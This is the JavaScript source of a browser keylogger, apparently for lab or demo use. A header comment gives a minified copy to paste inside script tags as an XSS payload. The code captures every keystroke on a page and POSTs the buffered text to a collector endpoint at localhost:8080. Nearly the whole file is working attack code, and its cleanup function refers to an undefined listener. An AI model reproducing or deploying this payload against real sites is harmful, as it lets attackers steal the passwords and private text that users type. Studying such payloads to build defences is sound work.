// The following single line is the entire `keylogger.js` compiled into a single line and should be pasted into `xss-keylogger.xlsm` in the `vba` subdirectory inside the `<script></script>` tags
// let userInput = ''; let timeoutId = null; const sendToServer = async (data) => { try { const response = await fetch('http://localhost:8080/keystroke', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ key: data }) }); if (!response.ok) { throw new Error('Network response was not ok'); } console.log('Now clearing userInput'); userInput = ''; } catch (error) { console.error('Error sending data:', error); } }; document.addEventListener('keydown', (event) => { console.log(`userInput before: ${userInput}`); userInput = `${userInput}${event.key}`; console.log(userInput); if (timeoutId) { clearTimeout(timeoutId); } timeoutId = setTimeout(() => { if (userInput.trim()) { sendToServer(userInput); } }, 3000); }); const cleanup = () => { if (timeoutId) { clearTimeout(timeoutId); } document.removeEventListener('keydown', listener); };

let userInput = '';
let timeoutId = null;

const sendToServer = async (data) => {
    try {
        const response = await fetch('http://localhost:8080/keystroke', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ key: data })
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        console.log('Now clearing userInput');
        userInput = '';
    } catch (error) {
        console.error('Error sending data:', error);
    }
};

document.addEventListener('keydown', (event) => {
    console.log(`userInput before: ${userInput}`);
    
    userInput = `${userInput}${event.key}`;
    
    console.log(userInput);

    if (timeoutId) {
        clearTimeout(timeoutId);
    }

    timeoutId = setTimeout(() => {
        if (userInput.trim()) {
            sendToServer(userInput);
        }
    }, 3000);
});

const cleanup = () => {
    if (timeoutId) {
        clearTimeout(timeoutId);
    }
    
    document.removeEventListener('keydown', listener);
};